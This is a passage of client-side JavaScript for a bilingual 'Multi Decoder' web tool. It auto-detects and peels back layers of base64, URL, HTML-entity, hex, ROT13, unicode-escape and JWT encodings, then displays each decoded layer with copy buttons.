            base64: function(s) {
                try {
                    const clean = s.replace(/[\s]/g, '');
                    if (!/^[a-zA-Z0-9+/]*={0,2}$/.test(clean)) return null;
                    const decoded = decodeURIComponent(escape(atob(clean)));
                    return decoded !== s ? decoded : null;
                } catch(e) { return null; }
            },
            url: function(s) {
                try { const d = decodeURIComponent(s); return d !== s ? d : null; } 
                catch(e) { return null; }
            },
            html: function(s) {
                try {
                    const d = document.createElement('div'); d.innerHTML = s;
                    const t = d.textContent; return t !== s ? t : null;
                } catch(e) { return null; }
            },
            hex: function(s) {
                const clean = s.replace(/\s|0x|\\x/g, '');
                if (!/^[0-9a-fA-F]+$/.test(clean) || clean.length % 2 !== 0) return null;
                let r = '';
                for (let i = 0; i < clean.length; i += 2) r += String.fromCharCode(parseInt(clean.substr(i, 2), 16));
                return r !== s ? r : null;
            },
            rot13: function(s) {
                const r = s.replace(/[a-zA-Z]/g, c => {
                    return String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
                });
                return r !== s ? r : null;
            },
            unicode: function(s) {
                try {
                    const d = s.replace(/\\u([0-9a-fA-F]{4})/g, (m, p) => String.fromCharCode(parseInt(p, 16)));
                    return d !== s ? d : null;
                } catch(e) { return null; }
            },
            jwt: function(s) {
                const parts = s.split('.');
                if (parts.length < 2) return null;
                function dec(str) {
                    str = str.replace(/-/g, '+').replace(/_/g, '/');
                    const pad = str.length % 4; if (pad) str += '===='.slice(pad);
                    return JSON.stringify(JSON.parse(decodeURIComponent(escape(atob(str)))), null, 2);
                }
                try { return 'Header:\n' + dec(parts[0]) + '\n\nPayload:\n' + dec(parts[1]); } 
                catch(e) { return null; }
            }
        };

        function detectEncoding(s) {
            const order = ['jwt', 'url', 'base64', 'html', 'unicode', 'hex', 'rot13'];
            for (let i = 0; i < order.length; i++) {
                try { const r = DECODERS[order[i]](s); if (r !== null && r !== s) return { type: order[i], result: r }; } catch(e) {}
            }
            return null;
        }

        function escapeHTML(s) {
            const d = document.createElement('div'); d.textContent = String(s || ''); return d.innerHTML;
        }

        function renderStepHtml(step, idx) {
            return `
            <div class="md-step-card">
                <div class="md-step-header">
                    <span class="md-step-badge">${step.type.toUpperCase()}</span>
                    <span class="md-text-layer">${lang === 'es' ? 'Capa' : 'Layer'} ${idx + 1}</span>
                    <button class="copy-btn-mini ml-auto" data-copy="${escapeHTML(step.result)}">📋</button>
                </div>
                <pre class="md-pre">${escapeHTML(step.result)}</pre>
            </div>`;
        }

        function attachCopyEvents() {
            document.querySelectorAll('#md-chain .copy-btn-mini').forEach(b => {
                b.addEventListener('click', function() {
                    window.copyToClipboard(this.dataset.copy);
                    this.textContent = '✅'; setTimeout(() => this.textContent = '📋', 1500);
                });
            });
        }

        btnDecode.addEventListener('click', () => {
            const s = mdInput.value.trim();
            if (!s) return;
            let result = null, type = null;
            if (activeMode !== 'auto') {
                try { result = DECODERS[activeMode](s); type = activeMode; } catch(e) {}
            } else {
                const d = detectEncoding(s); if (d) { result = d.result; type = d.type; }
            }

            if (result !== null && result !== undefined) {
                mdChain.innerHTML = renderStepHtml({ type, result }, 0); attachCopyEvents();
            } else {
                mdChain.innerHTML = `<p class="md-error-msg">❌ ${lang === 'es' ? 'No se pudo decodificar.' : 'Could not decode.'}</p>`;
            }
        });

        btnAutoChain.addEventListener('click', () => {
            const s = mdInput.value.trim();
            if (!s) return;
            let steps = [], current = s, max = 10;
            while (steps.length < max) {
                const d = detectEncoding(current);
                if (!d || d.result === current) break;
                steps.push(d); current = d.result;
            }

            if (!steps.length) {
                mdChain.innerHTML = `<p class="md-error-msg">❌ ${lang === 'es' ? 'No se detectaron encodings conocidos.' : 'No known encodings detected.'}</p>`;
                return;
            }

            const arrow = `<div class="md-arrow">↓</div>`;
            let html = `
            <div class="md-step-card md-step-card-auto">
                <div class="md-step-header md-step-header-auto">
                    <span class="md-text-original">${lang === 'es' ? 'TEXTO ORIGINAL' : 'ORIGINAL TEXT'}</span>
                </div>
                <pre class="md-pre md-pre-auto">${escapeHTML(s.slice(0, 500))}${s.length > 500 ? '...' : ''}</pre>
            </div>${arrow}`;

            steps.forEach((st, i) => { html += renderStepHtml(st, i) + (i < steps.length - 1 ? arrow : ''); });
            
            html += `<div class="md-layer-count">↳ ${steps.length} ${lang === 'es' ? 'capas decodificadas automáticamente' : 'layers decoded automatically'}</div>`;
            mdChain.innerHTML = html; attachCopyEvents();
        });
        })(); // <-- Esto cierra la burbuja "blindada" del Multi Decoder

}); // <--